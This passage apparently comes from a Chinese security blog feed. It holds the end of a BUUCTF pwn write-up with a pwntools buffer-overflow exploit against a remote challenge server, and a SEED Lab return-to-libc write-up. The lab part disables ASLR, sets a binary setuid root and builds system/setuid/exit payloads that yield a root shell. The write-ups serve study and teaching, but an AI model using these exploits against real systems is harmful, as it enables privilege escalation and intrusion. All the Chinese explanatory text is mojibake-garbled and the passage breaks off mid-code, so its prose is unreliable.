flagæ–‡ä»¶ï¼Œç„¶åputcharæ‰“å°å‡ºæ‰€æœ‰å­—ç¬¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">get_flag</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// al</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// al</span><br><br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">814536271</span> &amp;&amp; a2 == <span class="hljs-number">425138641</span> )<br>  &#123;<br>    v2 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>);<br>    v3 = getc(v2);<br>    <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">255</span> )<br>    &#123;<br>      v4 = (<span class="hljs-keyword">char</span>)v3;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-built_in">putchar</span>(v4);<br>        v5 = getc(v2);<br>        v4 = (<span class="hljs-keyword">char</span>)v5;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v5 != <span class="hljs-number">255</span> );<br>    &#125;<br>    fclose(v2);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯å°±å¾ˆç®€å•äº†ï¼Œå…ˆè°ƒç”¨get_flag_addrå‡½æ•°ï¼Œç„¶åå‚æ•°è®¾ç½®æ»¡è¶³<code>a1 == 814536271 &amp;&amp; a2 == 425138641</code>ï¼Œåœ¨è°ƒç”¨å®Œget_flag_addrä¹‹åï¼Œè¿”å›åœ°å€è®¾ç½®ä¸ºexit_addrï¼Œè¿™é‡Œå¦‚æœè®¾ç½®ä¸ºåˆ«çš„å€¼ï¼Œä¼šæŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26256</span>)<br><span class="hljs-comment">#sh=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><span class="hljs-comment">#elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><br>get_flag_addr= <span class="hljs-number">0x080489A0</span><br>exit_addr=<span class="hljs-number">0x804E6A0</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x38</span>)+p32(get_flag_addr)+p32(exit_addr)+p32(<span class="hljs-number">814536271</span>)+p32(<span class="hljs-number">425138641</span>)<br><br>sh.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šReturn to libc Attack Lab</title>
    <link href="/p/70d1fe8b/"/>
    <url>/p/70d1fe8b/</url>
    
    <content type="html"><![CDATA[<p>å…³äºropåŸç†çš„ä¸€ä¸ªè®²è¿°ï¼š</p><p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack">https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack</a></p><h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><ul><li><p>ä½¿ç”¨-m32æ ‡å¿—ç¼–è¯‘ä¸º32ä½çš„ç¨‹åº</p></li><li><p>å…³é—­åœ°å€éšæœºåŒ–ï¼š<code>sudo sysctl -w kernel.randomize_va_space=0</code></p></li><li><p>ä½¿ç”¨<code>-fno-stack-protected</code> é€‰é¡¹åœ¨ç¼–è¯‘æœŸé—´ç¦ç”¨StackGuardä¿æŠ¤ï¼Œæ¯”å¦‚<code>gcc -m32 -fno-stack-protector example.c</code></p></li><li><p>ç¨‹åº(å’Œå…±äº«åº“)çš„äºŒè¿›åˆ¶æ˜ åƒå¿…é¡»å£°æ˜å®ƒä»¬æ˜¯å¦éœ€è¦å¯æ‰§è¡Œå †æ ˆã€‚é€šè¿‡åœ¨ç¨‹åºå¤´ä¸­æ ‡è®°ä¸€ä¸ªå­—æ®µæ¥å†³å®šè¿™ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„å †æ ˆæˆæ˜¯å¯æ‰§è¡Œçš„/ä¸å¯æ‰§è¡Œçš„ã€‚æœ€è¿‘ç‰ˆæœ¬çš„Ubuntué»˜è®¤ç¨‹åºå †æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡<code>-z execstack</code>é€‰é¡¹æ¥ä½¿å¾—å †æ ˆå¯æ‰§è¡Œ</p></li><li><p>ä¸ºäº†ç®€åŒ–æ”»å‡»éš¾åº¦ï¼Œæˆ‘ä»¬éœ€è¦å°†/bin/shæŒ‡å‘/bin/zshã€‚åœ¨ Ubuntu 20.04ä¸­ï¼Œ/bin/sh ç¬¦å·é“¾æ¥æŒ‡å‘/bin/dash shellï¼Œæ­¤shellå…·æœ‰ä¿æŠ¤æœºåˆ¶ï¼šå¦‚æœdashæ˜¯åœ¨ Set-UID è¿›ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå®ƒä¼šç«‹å³å°†æœ‰æ•ˆç”¨æˆ· ID æ›´æ”¹ä¸ºå®é™…ç”¨æˆ· IDï¼Œä¹Ÿå³æ˜¯ä¼šæ”¾å¼ƒå…¶ç‰¹æƒã€‚<code>sudo ln -sf /bin/zsh /bin/sh</code></p></li></ul><p>ç»¼ä¸Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br><br>sudo ln -sf /bin/zsh /bin/sh<br><br>gcc -m32  -fno-stack-protector -z noexecstack -o retlib retlib.c<br><br>sudo chown root retlib<br><br>sudo chmod 4755 retlib<br><br>touch badfile <br><br>./retlib<br></code></pre></td></tr></table></figure><h1 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h1><p>åœ¨ Linux ä¸­ï¼Œå½“ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œlibc åº“å°†è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å½“å†…å­˜åœ°å€éšæœºåŒ–è¢«å…³é—­æ—¶ï¼Œå¯¹äºåŒä¸€ä¸ªç¨‹åºï¼Œåº“æ€»æ˜¯åŠ è½½åœ¨ç›¸åŒçš„å†…å­˜åœ°å€ä¸­(å¯¹äºä¸åŒçš„ç¨‹åºï¼Œlibc åº“çš„å†…å­˜åœ°å€å¯èƒ½æ˜¯ä¸åŒçš„)ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gdb è¿™æ ·çš„è°ƒè¯•å·¥å…·è½»æ¾æ‰¾åˆ° system ()çš„åœ°å€</p><p>å¯ä»¥å°†gdbçš„æ‰¹å¤„ç†å‘½ä»¤å†™åœ¨gdb_command.txtä¸­ï¼Œç„¶åè¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb -q -batch -x gdb_command.txt ./retlib<br></code></pre></td></tr></table></figure><p>gdb_command.txtï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">break</span> main<br>run<br>p system<br>p <span class="hljs-keyword">exit</span><br>quit<br></code></pre></td></tr></table></figure><p>systemåœ°å€ï¼š0xf7e11420</p><p>exitåœ°å€ï¼š0xf7e03f80</p><h1 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h1><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯è§¦å‘system()å‡½æ•°ï¼Œä¸”å‚æ•°æ˜¯<code>/bin/sh</code>ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°shellã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆçŸ¥é“å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€</p><p>å¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡çš„æ–¹å¼å®ç°ä¸Šè¿°ç›®æ ‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> MYSHELL=/bin/sh</span><br><span class="hljs-meta">$</span><span class="bash"> env | grep MYSHELL</span><br>MYSHELL=/bin/sh<br></code></pre></td></tr></table></figure><p>ç¼–å†™ç¨‹åº./prtenvæ‰“å°å‡º<code>/bin/sh</code>å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€ï¼Œæ³¨æ„åˆ°æ–‡ä»¶åå’Œretlibå¿…é¡»éƒ½æ˜¯ç›¸åŒå­—ç¬¦æ•°ç›®ï¼Œä¸ç„¶åœ°å€å¯èƒ½ä¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* shell = getenv(<span class="hljs-string">&quot;MYSHELL&quot;</span>);<br>    <span class="hljs-keyword">if</span> (shell)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)shell);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å­—ç¬¦ä¸²çš„åœ°å€ä¸º<code>ffffd45d</code></p><h1 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h1><p>è¿™ä¸ªä»»åŠ¡ä¸»è¦çŸ›ç›¾æ˜¯ç®—å‡ºX Y Zçš„å€¼ï¼Œä»¥åŠç³»ç»Ÿè°ƒç”¨å’Œå­—ç¬¦ä¸²çš„åœ°å€</p><p>è¿è¡Œretlibå¾—åˆ°bufferçš„åœ°å€å’Œebpçš„åœ°å€ï¼Œå¹¶ç®—å‡º0xffae1858å’Œ0xffae1840çš„å·®å€¼ï¼Œä¸º24</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨gdbè°ƒè¯•å¾—åˆ°ebpå’Œbufferçš„å·®å€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./retlib</span> <br>Address of input[] inside main():  0xffae1870<br>Input size: 300<br>Address of buffer[] inside bof():  0xffae1840<br>Frame Pointer value inside bof():  0xffae1858<br>Segmentation fault<br></code></pre></td></tr></table></figure><p>è¿”å›åœ°å€ç›¸å¯¹äºbufferçš„ä½ç½®æ˜¯ï¼šåç§»24+4=28ï¼Œè¿™é‡Œè¿”å›åœ°å€åº”è¯¥æ›¿æ¢ä¸ºsystemçš„åœ°å€</p><p>ç”±äºå›æ”¶æ ˆæ—¶å€™çš„leave retæ“ä½œï¼Œespä¼šè¢«æŠ¬é«˜4ä¸ªå­—èŠ‚ï¼Œå› æ­¤28+4+4æ˜¯systemå‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå³æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ï¼›28+4æ˜¯systemå‡½æ•°æ‰§è¡Œåéœ€è¦æ‰§è¡Œçš„ä¸‹ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå³æ˜¯exitå‡½æ•°</p><p>é¡ºå¸¦æä¸€ä¸‹ï¼Œæ ˆå›æ”¶æ—¶å€™çš„æ“ä½œï¼š</p><ul><li>mov %ebpï¼Œ%esp ã€‚å°†espæŒ‡å‘ebpæ‰€æŒ‡ï¼Œç›¸å½“äºå›æ”¶æ ˆåˆ†é…çš„ç©ºé—´</li><li>pop ebpã€‚æ¢å¤å‰æ ˆæŒ‡é’ˆï¼ŒåŒæ—¶esp=esp+4ï¼Œä¹Ÿå³æ˜¯æŒ‡å‘è¿”å›åœ°å€ã€‚ä¸Šé¢movå’Œpopè¯­å¥å¯ä»¥ç”¨ä¸€ä¸ªleaveä»£æ›¿</li><li>retæŒ‡ä»¤ç›¸å½“äºpop eipï¼Œå› æ­¤esp=esp+4ï¼Œä¹Ÿå³æ˜¯æŒ‡å‘è¿”å›åœ°å€+4å¤„ã€‚å› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨return addr+8çš„ä½ç½®</li><li>leaveæŒ‡ä»¤ä¹Ÿå³æ˜¯mov %ebpï¼Œ%esp + pop ebp</li></ul><p>è¦æ³¨æ„åˆ°pushå’ŒpopæŒ‡ä»¤éƒ½éšå«ç€espçš„æ”¹å˜</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs awk">--------------------------------------------------------------<br><br>`mov %ebpï¼Œ%esp`<br><br>     high         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   arg     â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚   <span class="hljs-keyword">exit</span>    â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚return addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>esp  ebp  â”€â”€â”€â–º <br>---------------------------------------------------------------<br><br>`pop ebp`<br><br><br>    ebp  â”€â”€â”€â–º<br><br>                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   arg     â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚   <span class="hljs-keyword">exit</span>    â”‚                  <br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    ebp  â”€â”€â”€â–º     â”‚return addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br><br>---------------------------------------------------------------<br>`ret` ä¹Ÿå³æ˜¯ `pop eip`<br>  <br>    ebp  â”€â”€â”€â–º<br><br>                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   arg     â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    esp  â”€â”€â”€â–º     â”‚    <span class="hljs-keyword">exit</span>   â”‚                  <br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    eip  â”€â”€â”€â–º     â”‚return addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br><br>          <br></code></pre></td></tr></table></figure><p>æ”»å‡»ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>X = <span class="hljs-number">36</span> <br>sh_addr = <span class="hljs-number">0xffffd45d</span>            <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Y = <span class="hljs-number">28</span> <br>system_addr = <span class="hljs-number">0xf7e11420</span>        <span class="hljs-comment"># The address of system()</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Z = <span class="hljs-number">32</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>  <span class="hljs-comment"># The address of exit()</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°root shellï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ ./retlib <br>Address <span class="hljs-keyword">of</span> input<span class="hljs-comment">[]</span> <span class="hljs-keyword">inside</span> main():  0xffffce00<br>Input size: 300<br>Address <span class="hljs-keyword">of</span> buffer<span class="hljs-comment">[]</span> <span class="hljs-keyword">inside</span> bof():  0xffffcdd0<br>Frame Pointer value <span class="hljs-keyword">inside</span> bof():  0xffffcde8<br># <br></code></pre></td></tr></table></figure><h1 id="Task-4-Defeat-Shellâ€™s-countermeasure"><a href="#Task-4-Defeat-Shellâ€™s-countermeasure" class="headerlink" title="Task 4: Defeat Shellâ€™s countermeasure"></a>Task 4: Defeat Shellâ€™s countermeasure</h1><p>å›å¿†ä¸€ä¸‹dashçš„é˜²å¾¡æœºåˆ¶ï¼šå¦‚æœdashæ˜¯åœ¨ Set-UID è¿›ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå®ƒä¼šç«‹å³å°†æœ‰æ•ˆç”¨æˆ· ID æ›´æ”¹ä¸ºå®é™…ç”¨æˆ· IDï¼Œä¹Ÿå³æ˜¯ä¼šæ”¾å¼ƒå…¶ç‰¹æƒ</p><p>ä¹‹å‰æˆ‘ä»¬æ‰‹åŠ¨å°†shæŒ‡å‘zshï¼Œè¿™ä¸ªä»»åŠ¡ä¸­æˆ‘ä»¬éœ€è¦é€šè¿‡<code>sudo ln -sf /bin/dash /bin/sh</code>å°†shæŒ‡å‘dashï¼Œä¹‹åæ”»ç ´dashçš„é˜²å¾¡æœºåˆ¶</p><h2 id="ä¸€ä¸ªå¤±è´¥çš„å°è¯•"><a href="#ä¸€ä¸ªå¤±è´¥çš„å°è¯•" class="headerlink" title="ä¸€ä¸ªå¤±è´¥çš„å°è¯•"></a>ä¸€ä¸ªå¤±è´¥çš„å°è¯•</h2><p>å¯¹æ ˆå¸§è¿›è¡Œè¦†ç›–ï¼Œä¸‹é¢é¡ºåºæ˜¯ä»é«˜åœ°å€åˆ°ä½åœ°å€çš„æ–¹å‘ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹Ÿå³æ˜¯system()å‡½æ•°çš„å‚æ•°<br><span class="hljs-number">0</span>ï¼Œä¹Ÿå³æ˜¯setuidå‡½æ•°çš„å‚æ•°<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>çš„åœ°å€<br><span class="hljs-function"><span class="hljs-title">setuid</span><span class="hljs-params">()</span></span>çš„åœ°å€<br></code></pre></td></tr></table></figure><p>è®¡ç®—ä¸€ä¸‹åœ°å€ï¼š</p><ul><li>setuidçš„åœ°å€ï¼š0xf7e98e30</li><li>systemåœ°å€ï¼š0xf7e11420</li><li>/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼šffffd466</li></ul><p>å†™ä¸ªpyè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>A  = <span class="hljs-number">40</span><br>sh_addr =     <span class="hljs-number">0xffffd465</span>   <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[A:A+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>B = <span class="hljs-number">36</span><br>zero_addr = <span class="hljs-number">0</span>        <span class="hljs-comment"># 0 </span><br>content[B:B+<span class="hljs-number">4</span>] = (zero_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>C = <span class="hljs-number">32</span><br>system_addr = <span class="hljs-number">0xf7e11420</span>  <span class="hljs-comment"># The address of system()</span><br>content[C:C+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>D = <span class="hljs-number">28</span><br>setuid_addr = <span class="hljs-number">0xf7e98e30</span>  <span class="hljs-comment"># The address of setuid()</span><br>content[D:D+<span class="hljs-number">4</span>] = (setuid_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><p>æ”»å‡»å¤±è´¥äº†ï¼Œå› ä¸ºbofä¸­è°ƒç”¨äº†strcpyå‡½æ•°ï¼Œåœ¨å¤åˆ¶è¿‡ç¨‹ä¸­é‡åˆ°ä¸Šé¢ä»£ç ä¸­B=36å¤„çš„0ä¼šå¯¼è‡´æˆªæ–­ï¼Œæ— æ³•å¤åˆ¶0åçš„/bin/bashï¼Œä¹Ÿå³æ˜¯systemå‡½æ•°ç¼ºå°‘å‚æ•°</p><h2 id="ä¸€ä¸ªæˆåŠŸçš„å°è¯•"><a href="#ä¸€ä¸ªæˆåŠŸçš„å°è¯•" class="headerlink" title="ä¸€ä¸ªæˆåŠŸçš„å°è¯•"></a>ä¸€ä¸ªæˆåŠŸçš„å°è¯•</h2><p>å­˜åœ¨è¿™æ ·ä¸€ä¸ªæœºåˆ¶ï¼šå¦‚æœæ˜¯/bin/sh -pï¼Œé‚£ä¹ˆä¸ä¼šæ”¾å¼ƒç‰¹æƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è§¦å‘<code>int execv(const char *pathname, char *const argv[]);</code></p><ul><li>pathnameå°±æ˜¯<code>/bin/sh</code></li><li>argv[0]æ˜¯<code>/bin/sh</code>ï¼Œargv[1]æ˜¯<code>-p</code>ï¼Œargv[2]æ˜¯0</li></ul><p>ä¸ºäº†ç¼–å†™exploit.pyï¼Œæˆ‘ä»¬éœ€è¦åšå¦‚ä¸‹å·¥ä½œï¼š</p><ul><li>exportç¯å¢ƒå˜é‡ï¼Œå¹¶æ‰“å°å‡ºå­—ç¬¦ä¸²çš„åœ°å€</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span 